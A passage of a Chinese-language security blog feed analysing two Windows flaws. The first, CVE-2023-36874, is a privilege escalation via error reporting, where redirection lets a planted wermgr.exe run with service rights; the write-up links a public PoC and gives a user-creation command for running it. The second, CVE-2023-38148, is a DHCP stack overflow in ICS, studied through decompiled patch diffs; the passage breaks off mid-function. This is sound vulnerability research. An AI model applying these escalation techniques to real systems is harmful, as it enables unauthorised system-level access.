&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (v10 &lt;span style="color:#f92672">=&lt;/span> CAutoImpersonate&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">ImpersonateUserHighestPrivs&lt;/span>((CAutoImpersonate &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v12), v10 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> CWerComReport&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">_SubmitReport&lt;/span>((CWerComReport &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)this &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span>), a2, a3, a4, a5, a6);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CAutoImpersonate&lt;span style="color:#f92672">::~&lt;/span>&lt;span style="color:#a6e22e">CAutoImpersonate&lt;/span>((CAutoImpersonate &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v12);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v10;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以可以总结出调用链：&lt;code>wecplsupport!CWerComReport::SubmitReport-&amp;gt;wecplsupport!CWerComReport::_SubmitReport-&amp;gt;wer.dll!WerpSubmitReportFromStore...-&amp;gt;CreateProcessW&lt;/code>&lt;/p>
&lt;p>问题在于在调用CreateProcessW时，CreateProcessW会使用攻击者设置的文件重定向，但将使用调用CreateProcessW的进程的security token设置进程的context，而不是模拟token来设置进程的security context。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912193450.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230912193521.png" />&lt;/p>
&lt;p>也就是攻击者可以通过文件重定向将 &lt;code>C:\Windows\System32&lt;/code>重定向到攻击者可控目录，并且在可控目录写入恶意 &lt;code>wermgr.exe&lt;/code>，当触发CreateProcessW时，CreateProcessW将使用攻击者控制的目录的wermgr.exe文件而不是系统在&lt;code>C:\Windows\System32&lt;/code>目录下的wermgr.exe文件。并且该进程上下文继承了调用进程的上下文，即继承了wer服务的权限。&lt;/p>
&lt;p>&lt;strong>动态调试&lt;/strong>
在 &lt;code>UtilLaunchWerManager&lt;/code>断点&lt;/p>
&lt;pre tabindex="0">&lt;code>bp wer!UtilLaunchWerManager
&lt;/code>&lt;/pre>&lt;p>调试器断下&lt;/p>
&lt;pre tabindex="0">&lt;code>0:006&amp;gt; g
Breakpoint 2 hit
wer!UtilLaunchWerManager+0xf3:
00007ffb`7b11a23f e87cb3f7ff call wer!StringCchCatW (00007ffb`7b0955c0)
0:006&amp;gt; rrcx
rcx=00000041e2efbce0
&lt;/code>&lt;/pre>&lt;p>&lt;strong>补丁分析&lt;/strong>
前面知道补丁直接阻断了后续调用_submit，也就没办法再调用CreateProcess，从而阻断了调用链。&lt;/p>
&lt;p>PoC&lt;/p>
&lt;pre tabindex="0">&lt;code>https://github.com/Wh04m1001/CVE-2023-36874
&lt;/code>&lt;/pre>&lt;p>需要注意的是运行poc需要使用不在&lt;code>admin&lt;/code>组的用户，新增用户运行&lt;/p>
&lt;pre tabindex="0">&lt;code>net user test 123456 /add
&lt;/code>&lt;/pre>&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/" target="_blank">https://www.crowdstrike.com/blog/falcon-complete-zero-day-exploit-cve-2023-36874/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-09-19T10:26:14+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-38148 Windows Ics Rce分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/</link><pubDate>Mon, 18 Sep 2023 16:18:40 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>依赖于ICS服务，Internet Connect Sharing，对应注册表，依赖&lt;code>ipnathlp.dll&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-reg" data-lang="reg">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>漏洞存在于处理DHCP请求时，由于没有检查边界，导致在使用memset时使用的长度参数来源于数据包内，可以导致栈溢出。
服务调试参考第二个参考链接。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>略&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>参考
&lt;a href="https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md" target="_blank">https://github.com/ruijanlee/h3cc/blob/master/h3cc_ruijanlee/doc/c8.md&lt;/a> ，同时加一个Linux，网卡使用第二个网卡，使得Linux发出的DHCP包能够被Windows接收到。&lt;/p>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;h4 id="静态分析">静态分析&lt;/h4>
&lt;p>对比补丁修复前后的逻辑，有两个明显的不同点，有两种产生漏洞的可能的地方。&lt;/p>
&lt;ol>
&lt;li>在修复版本中在进行 &lt;code>if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u )&lt;/code>判断之前先调用了 &lt;code>DumpDhcpHeaderInfo&lt;/code>，在漏洞代码中先进行判断在调用&lt;code>DumpDhcpHeaderInfo&lt;/code>&lt;/li>
&lt;li>在修复版本中如果满足 &lt;code>if ( *((_BYTE *)a2 + 230) &amp;gt; 0x20u )&lt;/code> 则进入if内，&lt;strong>在结束if语句时会通过跳转略过一部分处理逻辑，而在未修复版本内则还会继续处理。&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>可以看出 &lt;code>a2 + 230&lt;/code>为&lt;code>_NH_BUFFER&lt;/code> 结构体内的某个长度字段，该处为判断这个长度字段存储的长度，该漏洞应该是溢出漏洞，并且在产生漏洞的地方需要读取该字段。&lt;/p>
&lt;p>所以漏洞应该是第二点所说的，产生在略过的逻辑中。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 未修复代码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">DhcpProcessMessage&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> _DHCP_INTERFACE &lt;span style="color:#f92672">*&lt;/span>a1, &lt;span style="color:#66d9ef">struct&lt;/span> _NH_BUFFER &lt;span style="color:#f92672">*&lt;/span>a2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset_0&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>v12, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x40u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>((_BYTE &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">230&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x20u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v4 &lt;span style="color:#f92672">!=&lt;/span> (CInterfaceMonitor &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_GLOBAL_Control &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>((_BYTE &lt;span style="color:#f92672">*&lt;/span>)v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((_BYTE &lt;span style="color:#f92672">*&lt;/span>)v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">25&lt;/span>) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">WPP_SF_dD&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_QWORD &lt;span style="color:#f92672">*&lt;/span>)v4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">97&lt;/span>i64,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_2a3aeb8dd77c3a1919c551579bb6cf5d_Traceguids,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">230&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">32&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">_InterlockedIncrement&lt;/span>((&lt;span style="color:#66d9ef">volatile&lt;/span> &lt;span style="color:#66d9ef">signed&lt;/span> &lt;span style="color:#66d9ef">__int32&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>DhcpStatistics);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DumpDhcpHeaderInfo&lt;/span>(a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 修复代码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">DhcpProcessMessage&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> _DHCP_INTERFACE &lt;span style="color:#f92672">*&lt;/span>a1, &lt;span style="color:#66d9ef">struct&lt;/span> _NH_BUFFER &lt;span style="color:#f92672">*&lt;/span>a2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">memset_0&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>v11, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0x40u&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DumpDhcpHeaderInfo&lt;/span>(a2);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>((_BYTE &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">230&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x20u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( WPP_GLOBAL_Control &lt;span style="color:#f92672">!=&lt;/span> (CInterfaceMonitor &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_GLOBAL_Control
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>((_BYTE &lt;span style="color:#f92672">*&lt;/span>)WPP_GLOBAL_Control &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((_BYTE &lt;span style="color:#f92672">*&lt;/span>)WPP_GLOBAL_Control &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">25&lt;/span>) &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4u&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">WPP_SF_dd&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((_QWORD &lt;span style="color:#f92672">*&lt;/span>)WPP_GLOBAL_Control &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">97&lt;/span>i64,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>WPP_df007ca3347434f5610fc5a17e95e0a3_Traceguids,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">230&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">32&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_10;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_10:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">_InterlockedIncrement&lt;/span>((&lt;span style="color:#66d9ef">volatile&lt;/span> &lt;span style="color:#66d9ef">signed&lt;/span> &lt;span style="color:#66d9ef">__int32&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>DhcpStatistics);&lt;span style="color:#75715e">// 这里多了调用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_11:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">EnterCriticalSection&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>DhcpInterfaceLock);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">19&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">LeaveCriticalSection&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>DhcpInterfaceLock);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>略过的代码中，读取了a2参数的代码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#a6e22e">DhcpExtractOptionsFromMessage&lt;/span>((&lt;span style="color:#66d9ef">struct&lt;/span> _NH_BUFFER &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">228&lt;/span>), &lt;span style="color:#f92672">*&lt;/span>((_DWORD &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">55&lt;/span>), &lt;span style="color:#f92672">&amp;amp;&lt;/span>v11) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>v12 )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DhcpProcessBootpMessage&lt;/span>(a1, a2, &lt;span style="color:#f92672">&amp;amp;&lt;/span>v11);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#a6e22e">DhcpIsLocalHardwareAddress&lt;/span>((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>, &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">230&lt;/span>)) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(v12 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( v7 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DhcpProcessDiscoverMessage&lt;/span>(a1, a2, &lt;span style="color:#f92672">&amp;amp;&lt;/span>v11);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_BYTE &lt;span style="color:#f92672">*&lt;/span>)(v12 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DhcpProcessRequestMessage&lt;/span>(a1, a2, &lt;span style="color:#f92672">&amp;amp;&lt;/span>v11);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>DhcpArpForDad )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(_DWORD &lt;span style="color:#f92672">*&lt;/span>)(v13 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DhcpRemoveArpEntry&lt;/span>(v10);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DhcpCancelLease&lt;/span>(v10, (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>, &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">230&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_BYTE &lt;span style="color:#f92672">*&lt;/span>)(v12 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(_BYTE &lt;span style="color:#f92672">*&lt;/span>)(v12 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DhcpProcessInformMessage&lt;/span>(a1, a2, &lt;span style="color:#f92672">&amp;amp;&lt;/span>v11);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>DhcpArpForDad )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DhcpRemoveArpEntry&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>((_DWORD &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">60&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">DhcpCancelLease&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>((_DWORD &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">60&lt;/span>), (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">256&lt;/span>, &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)a2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">230&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查看这些函数代码，在 &lt;code>DhcpProcessBootpMessage&lt;/code>函数中有如下逻辑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">DhcpProcessBootpMessage&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> a2;
